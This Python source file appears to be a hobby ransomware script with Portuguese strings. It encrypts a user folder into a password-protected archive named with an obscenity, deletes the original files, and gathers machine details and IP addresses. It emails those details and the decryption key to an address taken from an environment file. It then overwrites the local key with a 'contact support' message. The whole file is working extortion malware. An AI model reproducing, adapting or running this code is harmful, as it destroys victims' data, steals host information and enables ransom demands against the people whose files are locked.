import os
import shutil
import smtplib
import socket
import sys
import urllib.request
from distutils.log import info
from os.path import exists
from pathlib import Path
from dotenv import load_dotenv
from time import sleep
from types import ClassMethodDescriptorType

import psutil
import pyzipper
from cryptography.fernet import Fernet
from requests import get

load_dotenv("./config/.env")

#print(os.environ.get('MAIL_USER'))

#Check if File key exists
if not exists('config/filekey.key'):
    open('config/filekey.key', 'w')

criptografadoNesteMomento = False
key = ''.encode()
while True:
    if exists('usuario/bloqueado.zip.FuckYourFiles'):
        with open('config/filekey.key', 'r') as filekey:
            key = filekey.read()
        print(key)
        break
    else:

        key = Fernet.generate_key()

        with open('config/filekey.key', 'wb') as filekey:
            filekey.write(key)

    def zip_folderPyzipper(folder_path, output_path):
        """Zip the contents of an entire folder (with that folder included
        in the archive). Empty subfolders will be included in the archive
        as well.
        """
        parent_folder = os.path.dirname(folder_path)
        # Retrieve the paths of the folder contents.
        contents = os.walk(folder_path)
        try:
            zip_file = pyzipper.AESZipFile(
                'bloqueado.zip.FuckYourFiles', 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES)
            zip_file.pwd = key
            for root, folders, files in contents:
                # Include all subfolders, including empty ones.
                for folder_name in folders:
                    absolute_path = os.path.join(root, folder_name)
                    relative_path = absolute_path.replace(parent_folder + '\\',
                                                          '')
                    print("Adding '%s' to archive." % absolute_path)
                    zip_file.write(absolute_path, relative_path)
                for file_name in files:
                    absolute_path = os.path.join(root, file_name)
                    relative_path = absolute_path.replace(parent_folder + '\\',
                                                          '')
                    print("Adding '%s' to archive." % absolute_path)
                    zip_file.write(absolute_path, relative_path)

            print("'%s' created successfully." % output_path)

        except IOError as message:
            print(message)
            sys.exit(1)
        except OSError as message:
            print(message)
            sys.exit(1)
        finally:
            zip_file.close()

    zip_folderPyzipper('E:\Projetos\DesktopApps\ransomware/usuario',
                       'C:/Users\jeffe\python\ransomware')

    for filename in os.listdir('E:\Projetos\DesktopApps\ransomware/usuario'):
        filepath = os.path.join(
            'E:\Projetos\DesktopApps\ransomware/usuario', filename)
        try:
            shutil.rmtree(filepath)
        except OSError:
            os.remove(filepath)
    shutil.move('bloqueado.zip.FuckYourFiles', 'usuario')
    criptografadoNesteMomento = True

print('parece que os arquivos j?? foram encriptados')

dados = []


def obtemInformacao():

    dados.append('CHAVE --->\n')
    dados.append(key)
    dados.append('\n\n')

    machineName = '\nnome da maquina:', os.getenv('COMPUTERNAME')
    dados.append(machineName)

    dados.append('\nDiretorio do usuario: ')
    home = str(Path.home())
    dados.append(home)

    hdd = psutil.disk_usage('/')
    memoriaTotal = '\n\nHD:\nTOTAL:', round(hdd.total / (2**30), 3)
    dados.append(memoriaTotal)
    memoriaUsada = ", USED: ", round(hdd.used / (2**30), 3)
    dados.append(memoriaUsada)
    memoriaLivre = ", FREE: ", round(hdd.free / (2**30), 3)
    dados.append(memoriaLivre)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ipLocal = s.getsockname()[0]
    dados.append('\n IP Local:')
    dados.append(ipLocal)
    s.close()

    dados.append('\n IP Publico:')
    ip = get('https://api.ipify.org').text
    dados.append(ip)

    ipExterno = f'public IP: {ip}'
    dados.append(ipExterno)


def connect(host='https://mail.google.com/'):
    try:
        urllib.request.urlopen(host)  # Python 3.x
        return True

    except:
        return False


# test
print("connected" if connect() else "erro de conex??o!")


def enviaInformacao():

    result = ''.join(''.join(map(str, tup)) for tup in dados)
    print(result)
    server = smtplib.SMTP_SSL(os.environ.get('MAIL_SERVER'), 465)
    server.login(os.environ.get('MAIL_USER'), os.environ.get('MAIL_PASSWD'))
    server.sendmail(os.environ.get('MAIL_USER'), os.environ.get('DESTINATION_EMAIL'), result)
    server.quit()


while True:
    confirmation = 'sim'
    informationSent = ''
    try:
        with open('config/informationSent.xml', 'r') as informationSentFile:
            informationSent = informationSentFile.read()
    except:
        print('as informa????es ainda n??o formam enviadas')
    if confirmation in informationSent and criptografadoNesteMomento == False:
        print('a informa????o j?? foi enviada')
        break

    elif connect():
        obtemInformacao()
        enviaInformacao()
        with open('config/informationSent.xml', 'w') as informationSentFile:
            informationSent = informationSentFile.write('sim')

        with open('config/filekey.key', 'w') as filekey:
            key = filekey.write(
                'entre em contato com o suporte')
        break
    else:
        print('falha na conex??o!\nTentando novamente...')
        sleep(1)
        os.system('cls')


#
